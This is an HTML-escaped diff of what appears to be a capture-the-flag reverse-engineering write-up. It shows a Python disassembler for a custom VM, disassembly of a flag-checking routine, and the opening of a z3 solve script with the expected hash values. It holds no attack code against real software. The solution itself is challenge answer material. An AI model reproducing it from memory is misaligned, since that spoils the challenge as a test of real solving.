-&lt;span style="color:#e6db74">&amp;#39;cmp.z {1:s}, {2:s} ; {1:s} = {2:s} == 0 &amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;if {2:s} = 0 jmp 0x{0:x}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;if {2:s} != 0 jmp 0x{0:x}&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;call 0x{0:x}&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> + &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># addition&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> - &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># subtract&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> * &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># multiply&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> / &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># division (quotient)&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> % &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># division (reminder)&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;gt;&amp;gt; &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># right shift&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;lt;&amp;lt; &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># left shift&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = -&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># negation&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># mov a, b&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = byte [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movzx&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = byte [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movsx&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = word [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movzx&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = word [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movsx&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = dword [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movzx&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = dword [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># movsx&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = qword [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># mov&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;mov byte [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">], &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;mov word [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">], &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;mov dword [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">], &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;mov qword [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">+0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">], &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;push &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;push 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;pop &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> | &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;amp; &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> ^ &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = ~ &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;cmp.s &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># smaller&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;cmp.se &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># smaller or equal&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;cmp.g &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># greater&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;cmp.ge &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;#39;&lt;/span>, &lt;span style="color:#75715e"># greater or equal&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> == &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74"> ; &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = 1&amp;#39;&lt;/span>, &lt;span style="color:#75715e">#equal&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;cmp.in &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{3:s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e">#inequal&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;cmp.eq &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74">, 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># if equal to const&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> != 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74"> ; &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = 1&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># if inequal to const&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;cmp.z &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> ; &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74"> = &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> == 0 &amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;if &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> = 0 jmp 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;if &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> != 0 jmp 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;call 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>,
 &lt;span style="color:#e6db74">&amp;#39;ret&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;if {2:s} != 0 ret&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;if {2:s} = 0 ret&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;lea {1:s}, [{2:s} + 0x{0:x}]&amp;#39;&lt;/span>,
-&lt;span style="color:#e6db74">&amp;#39;{1:s}, {2:s} &amp;gt;&amp;gt; 0x{0:x}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># rshift&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s}, {2:s} &amp;lt;&amp;lt; 0x{0:x}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># lshift&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s}, {2:s} | 0x{0:x}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># or&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s}, {2:s} &amp;amp; 0x{0:x}&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># and&lt;/span>
-&lt;span style="color:#e6db74">&amp;#39;{1:s}, {2:s} ^ 0x{0:x}&amp;#39;&lt;/span> &lt;span style="color:#75715e"># xor&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;if &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> != 0 ret&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;if &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> = 0 ret&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;lea &lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, [&lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> + 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">]&amp;#39;&lt;/span>,
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;gt;&amp;gt; 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># rshift&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;lt;&amp;lt; 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># lshift&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> | 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># or&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> &amp;amp; 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>, &lt;span style="color:#75715e"># and&lt;/span>
+&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{1:s}&lt;/span>&lt;span style="color:#e6db74">, &lt;/span>&lt;span style="color:#e6db74">{2:s}&lt;/span>&lt;span style="color:#e6db74"> ^ 0x&lt;/span>&lt;span style="color:#e6db74">{0:x}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span> &lt;span style="color:#75715e"># xor&lt;/span>
 ]
 &lt;span style="color:#75715e">#print(len(assembly_mapping))&lt;/span>
 addr &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x1190&lt;/span>
 &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> instructions:
-&lt;span style="color:#66d9ef">print&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;{:&amp;gt;10s}&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(&lt;span style="color:#e6db74">&amp;#39;0x{:x}: &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(addr)), end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
+print(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#e6db74">{:&amp;gt;10s}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(&lt;span style="color:#e6db74">&amp;#39;0x&lt;/span>&lt;span style="color:#e6db74">{:x}&lt;/span>&lt;span style="color:#e6db74">: &amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>format(addr)), end&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&lt;/span>)
 instr &lt;span style="color:#f92672">=&lt;/span> int&lt;span style="color:#f92672">.&lt;/span>from_bytes(i[&lt;span style="color:#ae81ff">2&lt;/span>:&lt;span style="color:#ae81ff">10&lt;/span>], byteorder&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#39;little&amp;#39;&lt;/span>)
 opcode &lt;span style="color:#f92672">=&lt;/span> i[&lt;span style="color:#ae81ff">10&lt;/span>]
 arg1 &lt;span style="color:#f92672">=&lt;/span> registers[i[&lt;span style="color:#ae81ff">11&lt;/span>]]
 arg2 &lt;span style="color:#f92672">=&lt;/span> registers[i[&lt;span style="color:#ae81ff">12&lt;/span>]]
 arg3 &lt;span style="color:#f92672">=&lt;/span> registers[i[&lt;span style="color:#ae81ff">13&lt;/span>]]
-&lt;span style="color:#66d9ef">print&lt;/span>(asm_instr[opcode]&lt;span style="color:#f92672">.&lt;/span>format(instr, arg1, arg2, arg3))
+print(asm_instr[opcode]&lt;span style="color:#f92672">.&lt;/span>format(instr, arg1, arg2, arg3))
 addr &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#ae81ff">14&lt;/span>
 &lt;span style="color:#66d9ef">with&lt;/span> open(&lt;span style="color:#e6db74">&amp;#39;flag_func&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;rb&amp;#39;&lt;/span>) &lt;span style="color:#66d9ef">as&lt;/span> f:
 flag_func &lt;span style="color:#f92672">=&lt;/span> f&lt;span style="color:#f92672">.&lt;/span>read()
 instructions &lt;span style="color:#f92672">=&lt;/span> [flag_func[i&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">14&lt;/span>:(i&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>)&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#ae81ff">14&lt;/span>] &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(len(flag_func)&lt;span style="color:#f92672">//&lt;/span>&lt;span style="color:#ae81ff">14&lt;/span>)]
 disassemble(instructions)
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>Now lets take a look at the actual disassembly of the vm&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp"> &lt;span style="color:#ae81ff">0x1190&lt;/span>&lt;span style="color:#f92672">:&lt;/span> rax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-cpp" data-lang="cpp"> &lt;span style="color:#ae81ff">0x1190&lt;/span>&lt;span style="color:#f92672">:&lt;/span> rax &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span>
 &lt;span style="color:#ae81ff">0x119e&lt;/span>&lt;span style="color:#f92672">:&lt;/span> rdi &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x2&lt;/span> ; r8 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>
 &lt;span style="color:#ae81ff">0x11ac&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#66d9ef">if&lt;/span> r8 &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> ret
 &lt;span style="color:#ae81ff">0x11ba&lt;/span>&lt;span style="color:#f92672">:&lt;/span> lea rsi, [rsi &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0x8&lt;/span>]
@@ -469,7 +469,7 @@ disassemble(instructions)
 &lt;li>now it compares it with a array at &lt;code>0x1fa0&lt;/code> and if they are equal returns 0 and prints &lt;code>OK!&lt;/code> if its correct or else it prints &lt;code>Wrong&lt;/code>&lt;/li>
 &lt;/ul>
 &lt;p>To verify the indices of the flag of which is between 30 characters with the global array it uses this algorithm&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">iterates over &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> times cause the len of the flag will be reduced &lt;span style="color:#66d9ef">as&lt;/span> we already know the first character which &lt;span style="color:#f92672">is&lt;/span> x
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">iterates over &lt;span style="color:#ae81ff">30&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> times cause the len of the flag will be reduced &lt;span style="color:#66d9ef">as&lt;/span> we already know the first character which &lt;span style="color:#f92672">is&lt;/span> x
 r8 &lt;span style="color:#f92672">=&lt;/span> qword [rdi&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x0&lt;/span>]
 r9 &lt;span style="color:#f92672">=&lt;/span> qword [rdi&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x8&lt;/span>]
 r8 &lt;span style="color:#f92672">=&lt;/span> r9 &lt;span style="color:#f92672">-&lt;/span> r8
@@ -478,14 +478,14 @@ r9 &lt;span style="color:#f92672">=&lt;/span> r8 &lt;span style="color:#f92672">
 r8 &lt;span style="color:#f92672">=&lt;/span> r9 &lt;span style="color:#f92672">*&lt;/span> r8
 mov qword [rdi&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#ae81ff">0x0&lt;/span>], r8
 &lt;/code>&lt;/pre>&lt;/div>&lt;p>The solve script using z3&lt;/p>
-&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
 &lt;span style="color:#f92672">from&lt;/span> z3 &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
 characters &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;abdfgehikmanoqrstucvwlxyz-01h23p456u78j9-_.+&amp;#39;&lt;/span>
 hash &lt;span style="color:#f92672">=&lt;/span> [
 &lt;span style="color:#ae81ff">5832&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">29791&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8000&lt;/span>, &lt;span style="color:#ae81ff">13824&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">6859&lt;/span>, &lt;span style="color:#ae81ff">5832&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">29791&lt;/span>, &lt;span style="color:#ae81ff">24389&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">10648&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">24389&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">13824&lt;/span>, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">17576&lt;/span>, &lt;span style="color:#ae81ff">2744&lt;/span>,
